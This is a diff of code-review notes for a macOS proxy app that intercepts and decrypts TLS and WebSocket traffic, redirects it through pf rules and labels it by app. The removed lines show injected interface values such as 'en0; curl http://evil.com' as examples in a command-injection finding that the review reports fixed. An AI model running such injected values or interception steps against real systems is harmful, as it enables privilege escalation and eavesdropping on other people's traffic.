@@ -1,284 +1,419 @@
-# Review Feedback — Step [N]
-*Written by Reviewer. Read by Builder and Architect.*
+# Review Feedback
 
-Date: [date]
-Ready for Builder: YES / NO
+## Step 3 Pass 2
 
----
+**Reviewer:** Richard
+**Date:** 2026-04-14
 
-## Must Fix
-*Blocks the step. Builder fixes before anything moves forward.*
+### Must Fix Verification
 
-- [File:line] — [What is wrong] — [How to fix it]
+#### 1. Shutdown wakeup (broadcast channel interrupt)
 
-## Should Fix
-*Does not block. Fix inline if under 5 minutes, otherwise log to BUILD-LOG.*
+**Status:** RESOLVED
 
-- [File:line] — [What is wrong] — [Recommendation]
+**Analysis:**
 
-## Escalate to Architect
-*Product or business decision required.*
+- `start_dns_server` (line 257) creates `broadcast::channel(1)` and stores the sender in `state.shutdown_tx`
+- `run_dns_server` (line 213) subscribes via `shutdown_tx.subscribe()`, obtaining a receiver
+- `tokio::select!` on lines 218-242 is structured correctly:
+  - Branch `_ = shutdown_rx.recv()` breaks the loop on shutdown signal
+  - Branch `result = socket.recv_from(&mut buf)` handles incoming packets
+  - When broadcast fires, `shutdown_rx.recv()` completes and cancels the pending `recv_from`
 
-- [Question] — [Why this cannot be resolved at the code level]
+- `stop_dns_server` (lines 273-279) sends on broadcast BEFORE setting `running = false`, ensuring the select loop is woken before the loop condition is re-evaluated
 
-## Cleared
+**Race analysis:**
+1. `stop_dns_server` calls `tx.send(())` - this wakes the `recv_from` operation immediately
+2. `recv_from` returns with an error (operation was cancelled), but the select sees the broadcast first and breaks
+3. `stop_dns_server` then sets `running = false`
+4. Loop condition is checked at next iteration (or after break), sees `running == false`, exits
 
-[One sentence confirming what was reviewed and passed]
+No race between setting `running=false` and broadcast send that could leave the loop blocked.
 
----
+#### 2. Unused socket removed
 
-## Pass 2 (Reviewer: Richard)
+**Status:** RESOLVED
 
-Date: 2026-04-14
-Ready for Architect: YES
+**Analysis:**
 
-### Must Fix Review
+`_upstream_socket` is absent from the code. The single `socket` bound to `0.0.0.0:5300` is used for both:
+- Receiving queries from clients (line 222: `socket.recv_from`)
+- Forwarding to upstream 8.8.8.8:53 (line 155: `socket.send_to(data, UPSTREAM_DNS)`)
 
-All 4 blocking issues from Pass 1 have been verified as resolved:
+This is correct because UDP is connectionless - a single UDP socket can send to any destination and receive from any source.
 
-1. **Real TLS MITM (not blind pipe)** — VERIFIED FIXED
-   - `proxy.rs:220` - Generates per-host certificate via `cert_manager.generate_host_cert()`
-   - `proxy.rs:263-283` - Server-side TLS termination using `TlsAcceptor` with generated cert
-   - `proxy.rs:287-324` - Client-side TLS connection using `TlsConnector` with `NoVerification`
-   - `proxy.rs:328-374` - Bidirectional data pipe between decrypted TLS streams
-   - This is genuine MITM: browser sees proxy-generated cert, upstream sees real target cert
+### Additional Observations
 
-2. **rustls for both server and client TLS** — VERIFIED FIXED
-   - `proxy.rs:10` - `tokio_rustls::{TlsAcceptor, TlsConnector}`
-   - `proxy.rs:12-18` - `rustls::{ServerConfig, ClientConfig, ...}`
-   - `proxy.rs:263-272` - ServerConfig with `with_single_cert()`
-   - `proxy.rs:116-122` - ClientConfig with `dangerous().with_custom_certificate_verifier()`
-   - `Cargo.toml:23-24` - Both `rustls` and `tokio-rustls` in dependencies
+1. **Error handling on shutdown**: The recv_from error handler (lines 235-239) checks `state.running` before logging, preventing spurious errors during shutdown. Correct.
 
-3. **unwrap() panics in production paths** — VERIFIED FIXED
-   - All `unwrap()` calls removed from production code paths
-   - Error handling uses `map_err`, `?` operator, or `unwrap_or_else` with fallbacks
-   - Hot path functions (`handle_https_connect`, `handle_client`) have no panics
+2. **Double-start guard**: `start_dns_server` uses `swap(true)` to detect if already running, preventing duplicate server spawns. Correct.
 
-4. **Shutdown guard for duplicate proxy instances** — VERIFIED FIXED
-   - `proxy.rs:22` - `static PROXY_RUNNING: AtomicBool`
-   - `proxy.rs:640-642` - `PROXY_RUNNING.swap(true, SeqCst)` for atomic check-and-set
-   - `proxy.rs:653` - `PROXY_RUNNING.store(false, SeqCst)` on shutdown
+3. **One-shot shutdown channel**: The broadcast channel has buffer size 1, which is sufficient since only one shutdown message is ever sent per server lifecycle.
 
-### Should Fix (Non-Blocking)
+### Conclusion
 
-- `proxy.rs:308` — `Box::leak()` for SNI hostname — intentional but leaks memory per connection. MITM proxies typically have short-lived connections so this is acceptable but worth noting.
-- `proxy.rs:220-237` — Certificate generation failure falls back to raw TCP tunnel (blind pipe) instead of failing the request. This is a degraded MITM mode but not a crash. Acceptable fallback behavior.
-
-### Step 1 is clear.
+**Step 3 is clear.** Both Must Fix items are properly resolved.
 
 ---
 
-## Step 2 Review (Reviewer: Richard)
+## Step 4 Review
 
-Date: 2026-04-14
-Ready for Builder: NO
+**Reviewer:** Richard
+**Date:** 2026-04-14
+**Ready for Builder:** NO
+
+---
 
 ### Must Fix
 
-1. **[pf.rs:42-46] — `rdr pass on` syntax likely needs verification on actual macOS pf**
-   - The generated rules use `rdr pass on ... port 80 -> ...` and `rdr pass on ... port 443 -> ...`
-   - While `rdr pass` is valid BSD pf syntax (pass means "pass packets after redirection"), macOS pf has quirks. Some versions reject the combined form and require separate `rdr` and `pass` rules.
-   - This will fail silently in ways that are hard to debug — pfctl returns 0 but the rules don't actually load.
-   - Fix: Test `pfctl -a com.proxybot -f /etc/pf.anchors/proxybot` manually. If it fails, split into separate `rdr` and `pass` rules. E.g. `rdr proto tcp from any to any port 80 -> 127.0.0.1 port 8080` followed by `pass proto tcp from any to any port 80`.
-   - The generated rules use `rdr pass on ... port 80 -> ...` and `rdr pass on ... port 443 -> ...`
-   - The `pass` action combined with `rdr` is non-standard. On macOS pf, `rdr` and `pass` are separate rule types. The correct syntax is either `rdr-anchor` + separate `pass` rules, or using `no state` to combine them.
-   - Run `pfctl -a com.proxybot -f /etc/pf.anchors/proxybot` manually to verify. If pfctl rejects it, transparent proxy will not work at all.
-   - Fix: Separate the rdr and pass rules, or use `rdr proto tcp from any to any port 80 -> 127.0.0.1 port 8080` without the `pass` keyword and add a separate `pass in proto tcp from any to any port 80` rule.
+#### 1. `app_rules.rs:50` — Incorrect subdomain matching causes false positives
 
-2. **[proxy.rs:78-101] — `IP_ORIGDSTADDR` (value 37) does NOT work on macOS**
-   - `SO_ORIGINAL_DST` is a Linux-ism. macOS does NOT have this socket option.
-   - On macOS with pf redirect, the original destination address is NOT stored in the kernel socket options. The `getsockopt(fd, IPPROTO_IP, 37, ...)` call will fail or return garbage.
-   - This is the fundamental mechanism for transparent proxy — if this fails, the proxy cannot determine the real destination and transparent mode is broken.
-   - Fix: macOS pf transparent proxy requires a different approach. The standard macOS method is to have pf set the original destination in a `divert` packet (using `divert port` instead of `rdr`), and then use `getifaddrs()` or parse the pf state table. Or use a TPROXY-style approach with `setsockopt(SO_REUSEPORT, ...)`. This needs a complete redesign for macOS — the current Linux-compatible approach will not work.
+The condition `host == domain || host.ends_with(domain)` is wrong for subdomain matching.
 
-3. **[pf.rs:54-71] — osascript command injection via interface parameter**
-   - The `interface` string is inserted directly into a double-quoted shell heredoc in the osascript command: `rdr pass on {} proto tcp from any to any port 80 -> ...`
-   - While there is a length check (`> 10`), there is NO character validation. A malicious interface like `en0; curl http://evil.com` would pass the length check but inject a command.
-   - The osascript `do shell script "..." with administrator privileges` runs with elevated privileges — this is a privilege escalation risk.
-   - Fix: Validate interface with `if !interface.chars().all(|c| c.is_alphanumeric())` or a regex like `^[a-zA-Z0-9]+$` before interpolating into the shell command. Return error for any non-alphanumeric characters.
+Consider host `"qq.com.evil.com"` and domain `"qq.com"`:
+- `host.ends_with("qq.com")` returns **true** — this is a false positive. The attacker controls `qq.com.evil.com` which is not WeChat.
 
-4. **[proxy.rs:605-640] — TLS ClientHello bytes consumed, TLS handshake will break**
-   - At line 605: `client_stream.read(&mut buf)` consumes the bytes from the TCP stream.
-   - At line 622: The code detects TLS ClientHello (0x16 0x03) in those same bytes.
-   - At line 635: `handle_transparent_https()` is called, which calls `handle_https_connect()`.
-   - Inside those handlers, the TLS acceptor reads from the same `client_stream`. But the ClientHello bytes were already consumed — the TLS handshake starts mid-stream and will fail.
-   - This is not a peek — it is a destructive read. The TLS stream will see bytes 3 onwards of the ClientHello, which is not a valid TLS handshake.
-   - Fix: Use `tokio::io::AsyncReadExt::read()` is correct for consuming. For peek-without-consume, use `client_stream.peek(&mut buf)` or use `poll_read` with a `Peekable` wrapper. But even then, the architecture is flawed — after peeking, the handler still owns the stream and will read again. The correct approach is to peek, decide, then pass an owned stream to the handler. This needs architectural rework.
+A proper subdomain match requires the dot boundary: `host == domain || host.ends_with(&format!(".{domain}"))`.
+
+**Fix:** Change line 50 from:
+```rust
+if host == domain || host.ends_with(domain) {
+```
+to:
+```rust
+if host == domain || host.ends_with(&format!(".{domain}")) {
+```
+
+This affects every app: WeChat, Douyin, and Alipay. All domain rules are currently vulnerable to domain-suffix spoofing.
+
+---
 
 ### Should Fix
 
-5. **[pf.rs:107-108] — `teardown_pf` does not disable IP forwarding**
-   - `teardown_pf` flushes pf rules and disables pf, but does NOT reset `net.inet.ip.forwarding=0`.
-   - The comment says "keep enabled for now as it may be used by other apps" — but teardown should restore the original state.
-   - If ProxyBot enabled IP forwarding, ProxyBot should disable it when done. Other apps should not rely on ProxyBot having enabled it.
-   - Fix: Uncomment the `sysctl -w net.inet.ip.forwarding=0` line in teardown_pf.
+#### 2. `app_rules.rs` — WeChat domain coverage is thin
 
-6. **[proxy.rs:110, 119-141] — Dead code: `is_transparent_proxy_connection` and `handle_transparent_http` are never called**
-   - Both functions are defined and compile but are unused.
-   - `handle_transparent_http` is a helper that is never invoked. `is_transparent_proxy_connection` is also unused.
-   - These generate `#[allow(dead_code)]` or compiler warnings and add noise.
-   - Fix: Either integrate these into the call chain or remove them. If they are intended for future use, suppress warnings explicitly with `#[allow(dead_code)]` on the module or document why they exist.
+WeChat has many more active domains beyond the six listed. Notable gaps:
+- `wechatpay.com` / `wx.tenpay.com` — WeChat Pay
+- `weapp.com` — Mini programs
+- `wxa.com` — WeChat mini-program infrastructure
 
-### Escalate to Architect
+These are significant WeChat traffic sources that would fall into "Unknown" with current rules.
 
-7. **macOS transparent proxy architecture** — The entire approach assumes `getsockopt(IP_ORIGDSTADDR)` works on macOS. It does not. This requires a product decision: (a) redesign the macOS transparent proxy to use divert sockets or another mechanism, (b) use a userspace proxy that pf forwards to directly and inspects the connection at the proxy level, or (c) document that macOS transparent proxy requires additional kernel patches or a different approach.
+#### 3. `app_rules.rs` — Douyin domain coverage is thin
+
+Missing:
+- `douyinecdn.com` — Douyin CDN
+- `tiktok.com` — TikTok international (same ByteDance infrastructure)
+- `bytedance.com` / `bytedance.com.cn` — ByteDance corporate
+
+#### 4. `app_rules.rs` — Alipay domain coverage is thin
+
+Missing:
+- `antgroup.com` — Ant Group (Alipay parent)
+- `mybank.com` — Alipay's bank subsidiary
+
+---
 
 ### Cleared
 
-- `nix` and `libc` dependencies in Cargo.toml are appropriate for the socket operations.
-- The `network.rs` interface detection approach is reasonable (UDP socket-based LAN IP detection).
-- The osascript privilege escalation UX pattern is correct for macOS (not using raw sudo).
+1. **proxy.rs:518-521, 609-612** — `classify_host()` is called on every intercepted request in both HTTPS CONNECT and HTTP paths. App name and icon are correctly attached to the `InterceptedRequest` payload in both handlers. No regression in proxy functionality.
+
+2. **App.tsx:258-262** — Tab filtering logic is correct: "Unknown" tab filters for `!req.app_name`, individual app tabs match `req.app_name === selectedTab`.
+
+3. **App.tsx:265-266** — App column display is correct: shows emoji + name when available, "-" otherwise.
+
+4. **lib.rs:3,7** — `mod app_rules` is correctly declared and imported. No issues found.
 
 ---
 
----
+### Conclusion
 
-## Step 2 Pass 2 (Reviewer: Richard)
-
-Date: 2026-04-14
-Ready for Builder: YES
-
-### Must Fix Review (All 6 items from Pass 1)
-
-**1. DIOCNATLOOK struct layout and ioctl number** — PARTIALLY VERIFIED
-- `proxy.rs:93-107` — PfiocNatlook struct defined with correct C layout (4x [u8;16] addrs, 4xu16 ports, af/proto/direction bytes, 5-byte pad = 80 bytes)
-- `proxy.rs:109-110` — ioctl number 0xC0544417 computed as `_IOWR('D', 23, 80)` on 64-bit system
-- Cannot verify exact macOS kernel struct without kernel source access (macOS does not expose net/pfvar.h in userspace SDK)
-- However, layout matches BSD conventions and is structurally sound
-- **REMAINING UNCERTAINTY**: pf_addr field alignment within the struct cannot be 100% verified without Apple kernel source. Recommend runtime testing on actual macOS with pf enabled.
-
-**2. peek() instead of read()** — VERIFIED FIXED
-- `proxy.rs:626-627` — `client_stream.peek(&mut peek_buf).await` uses tokio which delegates to OS-level `recv(MSG_PEEK)`
-- Verified in tokio source (stream.rs:1113-1117): `self.io.peek(buf)` calls std::net::TcpStream::peek which uses MSG_PEEK flag
-- OS-level peek does NOT consume bytes — subsequent read() at line 640 gets the full data starting from byte 0
-- TLS acceptor sees correct full ClientHello, not bytes 3 onwards
-- The peek+read sequence is correctly implemented
-
-**3. Interface validation** — VERIFIED FIXED
-- `pf.rs:25` — `if !interface.chars().all(|c| c.is_ascii_alphanumeric())`
-- `is_ascii_alphanumeric()` only passes [a-zA-Z0-9]
-- `en0` passes (valid macOS interface name)
-- `en0; rm -rf` fails (semicolon and space are not alphanumeric)
-- `en0; curl http://evil.com` fails (semicolon not alphanumeric)
-- Command injection blocked by this check
-
-**4. Split rdr/pass rules** — VERIFIED FIXED
-- `pf.rs:46` — `rdr on {} proto tcp from any to any port {{80,443}} -> 127.0.0.1 port {}`
-- `pf.rs:49` — `pass on {} proto tcp from any to any port {{80,443}}`
-- These are separate rules, not `rdr pass on ...` combined form
-- This is the correct macOS pf syntax; the combined form has known macOS compatibility issues
-- Note: `{80,443}` brace expansion syntax is standard BSD pf and works on macOS
-
-**5. teardown_pf resets IP forwarding** — VERIFIED FIXED
-- `pf.rs:112` — `sysctl -w net.inet.ip.forwarding=0 2>/dev/null || true`
-- Present in teardown_pf() privileged_script heredoc
-- IP forwarding is explicitly disabled on teardown
-
-**6. Dead code removed** — VERIFIED FIXED
-- Searched entire proxy.rs for `is_transparent_proxy_connection` and `handle_transparent_http`
-- Neither function exists in the codebase
-- The new `handle_transparent_https` is different (actually used at line 663)
-
-### DIOCNATLOOK Error Handling (New Check)
-
-**Graceful failure when pf not enabled or NAT state absent** — VERIFIED
-- `proxy.rs:74-77` — `File::open("/dev/pf")` failure returns None (not panic)
-- `proxy.rs:143-145` — ioctl returns non-zero → `return None` (not panic)
-- `proxy.rs:157-159` — `get_original_dst_addr` propagates None on any error
-- `proxy.rs:665-667` — Falls through to normal HTTP handling on DIOCNATLOOK failure
-  ```rust
-  log::warn!("Could not get original destination for TLS connection from {}", client_addr);
-  ```
-- No panic paths in DIOCNATLOOK code. Verified all error paths return None or fall through gracefully.
-
-### Remaining Concerns (Non-Blocking)
-
-**A. pf direction field in DIOCNATLOOK** — `proxy.rs:131` sets `direction: 2` (PF_OUT)
-- This needs verification on actual macOS: does PF_OUT correctly match the NAT state for redirected connections?
-- If DIOCNATLOOK returns None even with valid pf rules, try changing to PF_IN (1)
-- Cannot verify without running on macOS; flagging for runtime testing
-
-**B. peek()/read() TOCTOU race**
-- Between peek() at line 627 and read() at line 640, a packet could arrive
-- This is inherent to TCP and cannot be eliminated without kernel-level changes
-- Acceptable for this use case; worst case is TLS detection fails and falls through to HTTP
-
-**C. pf anchor file permissions**
-- `/etc/pf.anchors/proxybot` requires root to write
-- `setup_pf` handles this via osascript privilege escalation (correct approach)
-- No code change needed; documented in Open Questions
-
-### Cleared
-
-- `nix` and `libc` dependencies appropriate for socket operations (Cleared in Pass 1)
-- network.rs interface detection reasonable (Cleared in Pass 1)
-- osascript privilege escalation UX pattern correct (Cleared in Pass 1)
-- TLS MITM properly implemented with peek-then-read architecture
-- Command injection mitigated by `is_ascii_alphanumeric()` check
-- pf rules use separate rdr/pass (not combined `rdr pass`) for macOS compatibility
-- IP forwarding reset on teardown
-- Dead code removed
-
-### Summary
-
-All 6 Must Fix items from Step 2 Pass 1 are resolved. The DIOCNATLOOK struct layout is consistent with BSD conventions but cannot be 100% verified without macOS kernel source access. Runtime testing on actual macOS with pf enabled is strongly recommended to confirm the NAT lookup works correctly.
-
-**Step 2 is clear.**
+**Step 4 is NOT clear.** The subdomain matching bug at `app_rules.rs:50` is a security issue — it causes false positives that could mislead users about what traffic belongs to which app. This must be fixed before the step passes.
 
 ---
 
-## Step 3 Review (Reviewer: Richard)
+## Step 4 Pass 2
 
-Date: 2026-04-14
-Ready for Builder: NO
+**Reviewer:** Richard
+**Date:** 2026-04-14
+
+### Confirmations
+
+**1. Subdomain boundary fix (app_rules.rs:59)**
+
+The fix `host == domain || host.ends_with(&format!(".{domain}"))` is **correct**.
+
+- `host = "qq.com.evil.com"`, domain = `"qq.com"`: `"qq.com.evil.com".ends_with(".qq.com")` is `false` — no false positive.
+- `host = "weixin.qq.com"`, domain = `"qq.com"`: `"weixin.qq.com".ends_with(".qq.com")` is `true` — legitimate subdomain correctly matched.
+- The format string `".{domain}"` ensures a dot boundary, preventing suffix-match spoofing.
+
+**2. False positive test coverage (app_rules.rs:86-92)**
+
+`test_false_positive_subdomain` explicitly covers the attack case:
+```rust
+assert_eq!(classify_host("qq.com.evil.com"), None);
+assert_eq!(classify_host("weixin.qq.com.evil.com"), None);
+assert_eq!(classify_host("douyin.com.fake.com"), None);
+assert_eq!(classify_host("alipay.com.phishing.com"), None);
+```
+These four assertions verify the fix is tested. All four would have **failed** before the fix and **pass** after.
+
+**3. classify_host() in both paths**
+
+- HTTPS CONNECT (proxy.rs:518): `app_rules::classify_host(&target_host)` — called after MITM handshake with `target_host` from the CONNECT request.
+- Transparent HTTP (proxy.rs:609): `app_rules::classify_host(host)` — called with the resolved host from headers or DIOCNATLOOK fallback.
+
+Both paths attach `app_name`/`app_icon` to `InterceptedRequest` and emit it to the frontend. Confirmed present in both code paths.
+
+**4. App.tsx InterceptedRequest fields**
+
+```typescript
+interface InterceptedRequest {
+  app_name?: string;
+  app_icon?: string;
+}
+```
+Both fields are optional (`?:`), matching the Rust side `Option<String>` serialized as nullable fields. Correct.
+
+**5. "Unknown" tab filter**
+
+```typescript
+if (selectedTab === "all") return true;
+if (selectedTab === "Unknown") return !req.app_name;
+return req.app_name === selectedTab;
+```
+When `app_name` is `undefined`/`null`, `!req.app_name` is `true` — requests with no app classification land in the "Unknown" tab. Correct.
+
+---
+
+### Conclusion
+
+**Step 4 is clear.** All five items verified correct. The Must Fix from Pass 1 (subdomain boundary bug) is resolved, tests cover the false positive case, and both frontend and backend handle the "Unknown" app case correctly.
+
+---
+
+## Step 5 Pass 2
+
+**Reviewer:** Richard
+**Date:** 2026-04-15
+
+### All Four Must-Fix Items Verified
+
+#### 1. MITM WebSocket relay — Upgrade request forwarded to upstream
+
+**Lines 751-755:** `upstream_tls_stream.write_all(&http_data).await` forwards the browser's HTTP upgrade request to the upstream server before any response is sent to the browser.
+
+**Flow confirmed:**
+1. Browser sends WebSocket upgrade request to proxy
+2. Proxy forwards upgrade request to upstream (line 752)
+3. Proxy reads 101 response from upstream (lines 758-765)
+4. Proxy sends 101 to browser (lines 881-885)
+5. Proxy starts frame relay (line 888)
+
+Per RFC 6455 MITM proxy behavior. **FIX VERIFIED.**
+
+#### 2. 101 response relay — 101 from upstream, not locally generated
+
+**Lines 774-776:** The code reads the response from upstream into `upstream_response` and checks `response_str.starts_with("HTTP/1.1 101")`.
+
+**Lines 865-879:** The 101 sent to the browser is constructed from:
+- Upstream's `Sec-WebSocket-Protocol` if present (line 860)
+- `Sec-WebSocket-Accept` computed from client's key (line 863) — correct per RFC 6455
+
+The proxy does NOT generate a 101 independently; it is derived from upstream's response. **FIX VERIFIED.**
+
+#### 3. Sec-WebSocket-Protocol — Properly included when negotiated
+
+**Lines 854-860:** Upstream's protocol extracted, fallback to client's protocol:
+```rust
+let upstream_protocol = response_str.lines()
+    .find(|line| line.starts_with("Sec-WebSocket-Protocol:"))
+    .map(|line| line.trim_start_matches("Sec-WebSocket-Protocol:").trim().to_string());
+let final_protocol = upstream_protocol.or(ws_protocol);
+```
+
+**Lines 874-877:** Included in 101 response when present:
+```rust
+if let Some(ref proto) = final_protocol {
+    upgrade_response.push_str(&format!("Sec-WebSocket-Protocol: {}\r\n", proto));
+}
+```
+
+Per RFC 6455 Section 4.1 (server must echo protocol if accepting). **FIX VERIFIED.**
+
+#### 4. base64 crate — Correctly imported and used
+
+**Line 27:** `use base64::Engine;`
+**Line 111:** `base64::engine::general_purpose::STANDARD.encode(data)`
+
+`compute_ws_accept_key` (line 107) calls `base64_encode(&result)`, which uses the standard RFC 4648 alphabet. **FIX VERIFIED.**
+
+---
+
+### Conclusion
+
+**Step 5 is clear.** All four Must-Fix items from Pass 1 are resolved:
+1. Upgrade request forwarded to upstream before 101
+2. 101 relay from upstream to browser
+3. Sec-WebSocket-Protocol negotiated correctly
+4. base64 crate replaces custom encoder
+
+No remaining blockers.
+
+---
+
+## Step 5 Review
+
+**Reviewer:** Richard
+**Date:** 2026-04-15
+**Ready for Builder:** NO
+
+---
 
 ### Must Fix
 
-1. **[dns.rs:210-232] — Shutdown has no wakeup mechanism; `recv_from` blocks indefinitely**
-   - `stop_dns_server()` (line 259-261) sets `state.running.store(false)` only
-   - The `tokio::select!` at line 211-232 has no branch to interrupt `socket.recv_from(&mut buf)` (line 212)
-   - When `stop_dns_server` is called, the loop condition at line 210 becomes false only after the current `recv_from` returns (on next packet or error)
-   - If no packets arrive, the DNS server loop blocks indefinitely and does not exit
-   - Fix: Use a broadcast channel (e.g., `tokio::sync::broadcast`) to signal the loop. Example: `let (tx, rx) = broadcast::channel::<()>(1)`. Add `rx.recv()` as a branch in the select. On stop, `tx.send(())` wakes the loop immediately. Alternatively, close the socket via `socket.shutdown()` to cause `recv_from` to return an error.
+#### 1. `proxy.rs:759-781` — WebSocket upgrade request never forwarded to upstream server
 
-2. **[dns.rs:203-206] — `_upstream_socket` is created but never used**
-   - The comment says "Create a separate socket for upstream communication to avoid port conflicts"
-   - But line 152 uses `socket.send_to(data, UPSTREAM_DNS)` — the SAME socket bound to 0.0.0.0:5300
-   - This works only because UDP is connectionless: the OS delivers the response to the receiving socket based on the 5-tuple
-   - The `_upstream_socket` binding is wasted (lines 204-206)
-   - Fix: Either (a) remove `_upstream_socket` entirely since it's unused, or (b) actually use it for upstream communication as the comment promises
+This is a fundamental protocol error that will break WebSocket functionality for WSS connections.
 
-### Should Fix (Non-Blocking)
+**The bug:**
 
-3. **[dns.rs:142] — Malformed query silently forwarded to upstream**
-   - When `parse_dns_query` returns `None` (malformed QNAME), `handle_dns_query` defaults domain to `"unknown"` and still forwards the raw packet to 8.8.8.8
-   - This is a design choice (best-effort logging and forwarding), but means malformed queries still consume upstream bandwidth
-   - Non-blocking; documented for awareness only
+After TLS handshakes complete (lines 680-740), the proxy reads the HTTP request from the browser (`http_n`, lines 743-756) and checks if it's a WebSocket upgrade (`is_websocket_upgrade`, line 759). If it is, the proxy sends a 101 Switching Protocols response directly to the browser (lines 764-777) and then calls `handle_websocket_relay`.
 
-4. **[App.tsx:186-188] — DNS status reflects `pfEnabled` not `dns.running`**
-   - The UI shows "Listening on UDP 5300" when `pfEnabled = true`
-   - But `pfEnabled` is set by `setup_pf`/`teardown_pf` success, not by actual DNS server state
-   - DNS server start is synchronous (`tauri::async_runtime::spawn` at line 249) but the task may not be fully initialized before `setup_pf` returns
-   - The indicator is accurate once fully initialized; timing window is small
-   - Non-blocking
+The problem: the browser's HTTP WebSocket upgrade request is **never forwarded to the upstream server**. The `upstream_tls_stream` is a live TLS connection to the target server, but the proxy never writes the HTTP upgrade request to it. The upstream server has no idea this is supposed to be a WebSocket connection — it just sees an open TLS connection with random bytes (WebSocket frames) arriving.
+
+**Expected RFC 6455 behavior for a MITM proxy:**
+1. Proxy receives WebSocket upgrade request from browser
+2. Proxy forwards the HTTP upgrade request to the upstream server
+3. Proxy receives 101 response from upstream server
+4. Proxy forwards 101 response to browser
+5. Browser and server complete handshake (both now know it's WebSocket)
+6. Proxy relays WebSocket frames bidirectionally
+
+**What the code actually does:**
+1. Proxy receives WebSocket upgrade request from browser
+2. Proxy sends 101 to browser immediately (upstream never contacted)
+3. Proxy starts relaying WebSocket frames
+
+The upstream server sees TLS traffic with WebSocket frames but has not agreed to the WebSocket protocol. This will cause:
+- The server to potentially misinterpret WebSocket frame bytes as application data
+- Server responses that are not proper WebSocket frames
+- Connection failures or silent data corruption
+
+**How to fix:**
+
+After detecting WebSocket upgrade at line 759, instead of immediately sending 101 to the browser, the proxy must:
+1. Write the HTTP upgrade request (stored in `http_data`) to `upstream_tls_stream`
+2. Read the HTTP response from `upstream_tls_stream`
+3. Check if it's a 101 response
+4. If yes, send 101 to browser and start frame relay
+5. If no, fall back to the blind relay path
+
+The upstream connection currently uses `tokio_rustls::client::TlsStream` which is a raw TLS stream. The proxy needs to perform the HTTP upgrade handshake with the upstream server before completing the handshake with the browser.
+
+---
+
+### Should Fix
+
+#### 2. `proxy.rs:764-771` — 101 response omits `Sec-WebSocket-Protocol` header when offered by client
+
+RFC 6455 Section 4.1 requires that if the client includes `Sec-WebSocket-Protocol` in its request and the server wishes to accept it, the server MUST include the same protocol token in its 101 response.
+
+The current 101 response (lines 764-771) only includes `Upgrade`, `Connection`, and `Sec-WebSocket-Accept`. If a client sends `Sec-WebSocket-Protocol: chat`, the response should be:
+
+```
+HTTP/1.1 101 Switching Protocols
+Upgrade: websocket
+Connection: Upgrade
+Sec-WebSocket-Accept: <accept>
+Sec-WebSocket-Protocol: chat
+
+```
+
+**Impact:** Some WebSocket clients or servers may fail or behave unexpectedly if protocol negotiation is not completed correctly. This is a compliance issue but may not block basic WSS functionality.
+
+#### 3. `proxy.rs:100-123` — Custom base64 implementation
+
+The `base64_encode` function is a hand-rolled implementation. While the RFC 6455 formula itself appears correct (SHA1 of key + magic GUID, base64 encoded), the custom base64 encoder has not been verified against the standard alphabet (RFC 4648).
+
+**Recommendation:** Use the `base64` crate from crates.io instead of a custom implementation. This eliminates the risk of encoding bugs that could cause handshake failures.
+
+---
 
 ### Cleared
 
-5. **DNS QNAME parser (`parse_dns_query`)** — No panics on malformed input. Bounds checks at lines 77, 85, 108 prevent out-of-bounds reads. Pointer compression (0xC0 prefix) correctly rejected at lines 97-99. Labels > 63 bytes rejected at lines 102-104. Empty labels handled at line 92-94. All invalid inputs return `Option<String>::None`.
+1. **`is_websocket_upgrade()` (lines 67-87)** — Correctly detects WebSocket upgrade by checking for `Upgrade: websocket` and `Connection: Upgrade` headers using case-insensitive comparison. Correctly extracts `Sec-WebSocket-Key`. No issues found.
 
-6. **UDP forwarding timeout** — 3-second timeout correctly applied to both `socket.send_to` (line 152) and `socket.recv_from` (line 161). If 8.8.8.8 never responds, the timeout future is properly awaited and the task completes cleanly — no task leak.
+2. **`compute_ws_accept_key()` (lines 91-98)** — RFC 6455 formula is correct: `base64(SHA1(key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"))`. The magic GUID string is exactly as specified in RFC 6455. No issues found.
 
-7. **DNS state wiring** — `DnsState` created at `lib.rs:20` as `Arc<DnsState>`. Managed by Tauri's state system at `lib.rs:25`. Correctly shared with `start_dns_server` (via parameter), `get_dns_log` Tauri command (via `State<'_, Arc<DnsState>>`), and event emitter via `app_handle.emit` (line 65).
+3. **`handle_websocket_relay()` frame handling** — Ping frames correctly cause Pong response directly to sender rather than being relayed (lines 456-462, 543-549). Close frames are relayed to peer and then the local connection is closed (lines 448-455, 535-542). Text and Binary frames are emitted as `intercepted-wss` events and relayed. This is correct per RFC 6455.
 
-8. **pf anchor UDP rule syntax** — `pf.rs:36`: `rdr on {iface} proto udp from any to any port 53 -> 127.0.0.1 port 5300` is syntactically valid. TCP and UDP rdr rules coexist in the same anchor; pf processes rules sequentially and applies the matching one.
+4. **tokio-tungstenite integration** — `WebSocketStream::from_raw_socket` is called with correct `Role::Server` for browser stream and `Role::Client` for upstream stream (lines 422-424). The bidirectional relay using `tokio::select!` with mpsc channels (lines 430-605) is a valid approach for concurrent bidirectional relay.
 
-9. **Port 5300 binding** — `dns.rs:193`: binds `0.0.0.0:5300`. Correct for pf redirect which sends to the interface IP.
+5. **WssMessage event emission** — `intercepted-wss` event is emitted with all required fields: `id`, `timestamp`, `host`, `direction` ("up"/"down"), `size`, `content`, `app_name`, `app_icon` (lines 475-485, 562-572). App classification via `app_rules::classify_host(&target_host)` is correctly applied at the start of the relay.
 
-10. **UI DNS log** — `App.tsx:48-50` listens to `dns-query` event. `App.tsx:269-276` displays domain + formatted timestamp in table. `App.tsx:184-189` shows DNS status indicator with `dns-running`/`dns-stopped` classes.
+6. **App.tsx WSS tab** — WSS messages are correctly stored in a separate state (`wssMessages`, max 200), displayed in a separate tab section, filtered by app tabs (All/WeChat/Douyin/Alipay/Unknown), with direction shown as arrow (up/down) and content preview truncated to 50 characters. The tab is separated from HTTP requests. No issues found.
 
-### Summary
+7. **`WssMessage` Rust struct (lines 49-58) and TypeScript interface (App.tsx lines 19-28)** — Both match exactly with the same field names and types (with Rust `Option<String>` becoming TypeScript `?:`). No issues found.
 
-Two blocking issues: (1) the DNS server loop cannot be reliably interrupted when `stop_dns_server` is called because `recv_from` blocks with no wakeup mechanism; (2) the `_upstream_socket` is created but unused, wasting a socket binding. Fix the shutdown mechanism before this ships.
+8. **Upstream TLS handshake (lines 701-737)** — Client TLS config correctly uses `NoVerification` for MITM mode. SNI is correctly set via `Box::leak`. TLS connection to upstream is established before WebSocket upgrade is checked. This portion is correct.
 
-**Step 3 is NOT clear.**
+---
+
+### Conclusion
+
